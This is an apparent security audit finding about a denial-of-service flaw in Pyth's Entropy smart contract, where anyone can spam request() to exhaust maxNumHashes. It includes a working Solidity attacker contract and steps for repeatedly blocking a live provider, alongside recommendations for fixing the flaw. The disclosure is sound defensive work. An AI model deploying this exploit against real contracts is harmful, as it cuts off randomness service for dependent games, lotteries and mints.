### Title
Permissionless `request()` Exhausts `maxNumHashes` and DoS-es New Entropy Requests — (`target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

### Summary

Any unprivileged caller can spam `request()` / `requestV2()` against a provider that has `maxNumHashes > 0` set, driving `numHashes` past the limit and causing every subsequent legitimate user request to revert with `LastRevealedTooOld`. The only recovery is an off-chain keeper calling `advanceProviderCommitment`, which the attacker can immediately outpace again.

### Finding Description

`requestHelper` in `Entropy.sol` assigns a monotonically increasing `sequenceNumber` to every request and computes:

```
req.numHashes = assignedSequenceNumber - providerInfo.currentCommitmentSequenceNumber
```

It then enforces:

```solidity
if (
    providerInfo.maxNumHashes != 0 &&
    req.numHashes > providerInfo.maxNumHashes
) {
    revert EntropyErrors.LastRevealedTooOld();
}
``` [1](#0-0) 

`providerInfo.currentCommitmentSequenceNumber` only advances when the provider (or keeper) calls `advanceProviderCommitment` or when a reveal is processed. `providerInfo.sequenceNumber` advances on **every** call to `request()` / `requestV2()`, which is fully permissionless and payable by anyone. [2](#0-1) 

An attacker who observes that a provider has `maxNumHashes = M` and the current gap is `G = sequenceNumber - currentCommitmentSequenceNumber` can submit `M - G` requests (each paying the minimum fee), filling the gap to exactly `M`. The very next legitimate user request will revert with `LastRevealedTooOld`.

The Fortuna keeper monitors this and calls `advanceProviderCommitment` when the gap exceeds 95 % of `maxNumHashes`: [3](#0-2) 

However, the keeper runs on a 30-second polling interval and the attacker can immediately re-fill the gap after each keeper response, sustaining the DoS indefinitely at the cost of `(M - G) × fee` per cycle.

### Impact Explanation

All new randomness requests to the targeted provider are blocked until `advanceProviderCommitment` is called. Consumer contracts that depend on Entropy (e.g., NFT mints, on-chain games, lotteries) cannot obtain random numbers. Funds already paid for pending requests are not lost, but the service is unavailable for the duration of the attack. This is a **Denial of Service** against the Entropy randomness service.

### Likelihood Explanation

- `request()` is fully permissionless; no special role is required.
- The default Pyth provider sets `maxNumHashes` (confirmed by the keeper's `max_num_hashes == 0` early-exit guard).
- Attack cost scales with `maxNumHashes × fee`. On low-fee chains (e.g., BNB, Polygon, Arbitrum) where the provider fee is a few hundred wei, the cost per cycle can be negligible.
- The keeper's 30-second polling window gives the attacker ample time to re-fill the gap after each recovery.
- The Fortuna keeper code itself acknowledges this vector: `"possible outage or DDOS attack"`. [4](#0-3) 

### Recommendation

1. **Rate-limit or cap concurrent open requests per provider** on-chain, so a single address cannot fill the entire `maxNumHashes` window.
2. **Require a minimum fee floor** that makes filling `maxNumHashes` economically prohibitive.
3. **Reduce the keeper polling interval** or trigger `advanceProviderCommitment` reactively (e.g., via an on-chain event watcher) rather than on a fixed 30-second timer.
4. Consider allowing the provider to **permissionlessly advance their own commitment** in the same transaction as a new request, so the gap never accumulates.

### Proof of Concept

```solidity
// Attacker contract
contract EntropyDoS {
    IEntropy entropy;
    address provider;

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    // Call this repeatedly to keep numHashes at maxNumHashes
    function spam(uint32 count) external payable {
        uint128 fee = entropy.getFee(provider);
        bytes32 userCommitment = entropy.constructUserCommitment(bytes32(uint256(1)));
        for (uint32 i = 0; i < count; i++) {
            entropy.request{value: fee}(provider, userCommitment, false);
        }
    }
}
```

1. Deploy `EntropyDoS` pointing at the live Entropy contract and the default provider.
2. Read `providerInfo.maxNumHashes` (e.g., `M = 100`) and the current gap `G`.
3. Call `spam(M - G)` — all slots are now consumed.
4. Any subsequent `request()` from a legitimate user reverts with `LastRevealedTooOld`.
5. After the keeper calls `advanceProviderCommitment` (~30 s), call `spam(M)` again to re-DoS.

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L228-235)
```text
        uint64 assignedSequenceNumber = providerInfo.sequenceNumber;
        if (assignedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.OutOfRandomness();
        providerInfo.sequenceNumber += 1;

        // Check that fees were paid and increment the pyth / provider balances.
        uint128 requiredFee = getFeeV2(provider, callbackGasLimit);
        if (msg.value < requiredFee) revert EntropyErrors.InsufficientFee();
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L247-256)
```text
        req.numHashes = SafeCast.toUint32(
            assignedSequenceNumber -
                providerInfo.currentCommitmentSequenceNumber
        );
        if (
            providerInfo.maxNumHashes != 0 &&
            req.numHashes > providerInfo.maxNumHashes
        ) {
            revert EntropyErrors.LastRevealedTooOld();
        }
```

**File:** apps/fortuna/src/keeper/commitment.rs (L55-69)
```rust
    let threshold =
        ((provider_info.max_num_hashes as f64) * UPDATE_COMMITMENTS_THRESHOLD_FACTOR) as u64;
    let outstanding_requests =
        provider_info.sequence_number - provider_info.current_commitment_sequence_number;
    if outstanding_requests > threshold {
        // NOTE: This log message triggers a grafana alert. If you want to change the text, please change the alert also.
        tracing::warn!("Update commitments threshold reached -- possible outage or DDOS attack. Number of outstanding requests: {:?} Threshold: {:?}", outstanding_requests, threshold);
        let seq_number = provider_info.sequence_number - 1;
        let provider_revelation = chain_state
            .state
            .reveal(seq_number)
            .map_err(|e| anyhow!("Error revealing: {:?}", e))?;
        let contract_call =
            contract.advance_provider_commitment(provider_address, seq_number, provider_revelation);
        send_and_confirm(contract_call).await?;
```
